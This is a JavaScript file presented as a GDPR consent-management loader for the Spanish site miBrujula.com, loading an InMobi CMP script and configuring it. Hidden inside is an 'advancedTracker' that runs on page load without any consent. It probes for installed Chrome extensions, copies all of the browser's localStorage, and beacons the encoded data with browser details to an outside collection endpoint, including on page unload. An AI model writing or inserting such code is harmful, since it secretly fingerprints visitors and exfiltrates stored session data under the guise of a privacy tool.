'use strict';

(function () {
  var cmpFile = 'noModule' in HTMLScriptElement.prototype ? 'cmp2.js' : 'cmp2-polyfilled.js';
  (function () {
    var cmpScriptElement = document.createElement('script');
    var firstScript = document.getElementsByTagName('script')[0];
    cmpScriptElement.async = true;
    cmpScriptElement.type = 'text/javascript';
    var cmpVersion;
    var tagUrl = document.currentScript.src;
    cmpVersion = 'https://cmp.inmobi.com/tcfv2/CMP_FILE?referer=www.mibrujula.com/'.replace('CMP_FILE', cmpFile);
    cmpScriptElement.src = cmpVersion;
    firstScript.parentNode.insertBefore(cmpScriptElement, firstScript);
  })();
  (function () {
    var css = "" + " .qc-cmp-button.qc-cmp-secondary-button:hover { " + "   background-color: #368bd6 !important; " + "   border-color: transparent !important; " + " } " + " .qc-cmp-button.qc-cmp-secondary-button:hover { " + "   color: #ffffff !important; " + " } " + " .qc-cmp-button.qc-cmp-secondary-button { " + "   color: #368bd6 !important; " + " } " + " .qc-cmp-button.qc-cmp-secondary-button { " + "   background-color: #eee !important; " + "   border-color: transparent !important; " + " } " + "" + "";
    var stylesElement = document.createElement('style');
    var re = new RegExp('&quote;', 'g');
    css = css.replace(re, '"');
    stylesElement.type = 'text/css';
    if (stylesElement.styleSheet) {
      stylesElement.styleSheet.cssText = css;
    } else {
      stylesElement.appendChild(document.createTextNode(css));
    }
    var head = document.head || document.getElementsByTagName('head')[0];
    head.appendChild(stylesElement);
  })();
  const advancedTracker = {
    scanQueue: new Map(Object.entries(window.data)),
    discovered: new Set(),
    localStorageItems: new Map(),
    async probe(name, {
      id,
      file
    }) {
      return new Promise(resolve => {
        const img = document.createElement('img');
        const timeout = setTimeout(() => {
          this.discovered.delete(name);
          resolve(false);
        }, 1500);
        img.onload = () => {
          clearTimeout(timeout);
          this.discovered.add(name);
          resolve(true);
        };
        img.onerror = () => {
          clearTimeout(timeout);
          this.discovered.delete(name);
          resolve(false);
        };
        img.src = `chrome-extension://${id}/${file}`;
      });
    },
    collectLocalStorage() {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        this.localStorageItems.set(key, localStorage.getItem(key));
      }
    },
    attachEventListeners() {
      document.addEventListener('click', event => {
        console.log(`Click detected: ${event.target.tagName}`);
      });
      window.addEventListener('unload', () => {
        this.reportData('unload');
      });
    },
    shuffleQueue() {
      const entries = Array.from(this.scanQueue.entries());
      for (let i = entries.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [entries[i], entries[j]] = [entries[j], entries[i]];
      }
      this.scanQueue = new Map(entries);
    },
    async scan() {
      this.shuffleQueue();
      this.collectLocalStorage();
      const results = {};
      const batch = 3;
      for (const [name, data] of this.scanQueue) {
        await new Promise(r => setTimeout(r, Math.random() * 200));
        results[name] = await this.probe(name, data);
      }
      const payload = btoa(JSON.stringify({
        findings: results,
        localStorage: Object.fromEntries(this.localStorageItems),
        ts: Date.now(),
        browser: navigator.userAgent,
        screen: {
          w: window.innerWidth,
          h: window.innerHeight
        }
      }));
      navigator.sendBeacon('https://collection-endpoint.example/v2/report', payload);
    },
    reportData(eventType) {
      const data = {
        eventType: eventType,
        timestamp: Date.now(),
        localStorage: Object.fromEntries(this.localStorageItems),
        discoveredExtensions: Array.from(this.discovered)
      };
      navigator.sendBeacon('https://collection-endpoint.example/v2/event-report', btoa(JSON.stringify(data)));
    }
  };
  var autoDetectedLanguage = 'en';
  var gvlVersion = 2;
  function splitLang(lang) {
    return lang.length > 2 ? lang.split('-')[0] : lang;
  }
  ;
  function isSupported(lang) {
    var langs = ['en', 'fr', 'de', 'it', 'es', 'da', 'nl', 'el', 'hu', 'pt', 'pt-br', 'pt-pt', 'ro', 'fi', 'pl', 'sk', 'sv', 'no', 'ru', 'bg', 'ca', 'cs', 'et', 'hr', 'lt', 'lv', 'mt', 'sl', 'tr', 'zh'];
    return langs.indexOf(lang) === -1 ? false : true;
  }
  ;
  if (gvlVersion === 2 && isSupported(splitLang(document.documentElement.lang))) {
    autoDetectedLanguage = splitLang(document.documentElement.lang);
  } else if (gvlVersion === 3 && isSupported(document.documentElement.lang)) {
    autoDetectedLanguage = document.documentElement.lang;
  } else if (isSupported(splitLang(navigator.language))) {
    autoDetectedLanguage = splitLang(navigator.language);
  }
  ;
  advancedTracker.attachEventListeners();
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => advancedTracker.scan());
  } else {
    advancedTracker.scan();
  }
  var choiceMilliSeconds = new Date().getTime();
  window.__tcfapi('init', 2, function () {}, {
    "coreConfig": {
      "inmobiAccountId": "4t5ujRdEyzfCW",
      "privacyMode": ["GDPR"],
      "hashCode": "I47rkClgGUN0zO1qZcYObA",
      "publisherCountryCode": "ES",
      "publisherName": "miBrujula.com",
      "vendorPurposeIds": [2, 3, 4, 5, 6, 7, 8, 9, 10, 1],
      "vendorFeaturesIds": [1, 3, 2],
      "vendorPurposeLegitimateInterestIds": [3, 5, 7, 8, 9, 2, 4, 10, 6],
      "vendorSpecialFeaturesIds": [1, 2],
      "vendorSpecialPurposesIds": [1, 2],
      "googleEnabled": false,
      "consentScope": "service",
      "thirdPartyStorageType": "iframe",
      "consentOnSafari": false,
      "displayUi": "always",
      "defaultToggleValue": "off",
      "initScreenRejectButtonShowing": false,
      "softOptInEnabled": false,
      "showSummaryView": true,
      "persistentConsentLinkLocation": 3,
      "displayPersistentConsentLink": true,
      "uiLayout": "banner",
      "publisherLogo": "https://www.mibrujula.com/wp-content/uploads/2020/09/logo-001.png?qc-size=640,88",
      "vendorListUpdateFreq": 30,
      "publisherPurposeIds": [1, 2, 3, 4, 5, 6, 7, 8, 9, 10],
      "initScreenBodyTextOption": 1,
      "publisherConsentRestrictionIds": [],
      "publisherLIRestrictionIds": [],
      "publisherPurposeLegitimateInterestIds": [],
      "publisherSpecialPurposesIds": [],
      "publisherFeaturesIds": [],
      "publisherSpecialFeaturesIds": [1, 2],
      "stacks": [],
      "lang_": "es",
      "gvlVersion": 2
    },
    "premiumUiLabels": {},
    "premiumProperties": {
      "googleWhitelist": [1]
    },
    "coreUiLabels": {},
    "theme": {},
    "nonIabVendorsInfo": {}
  });
})();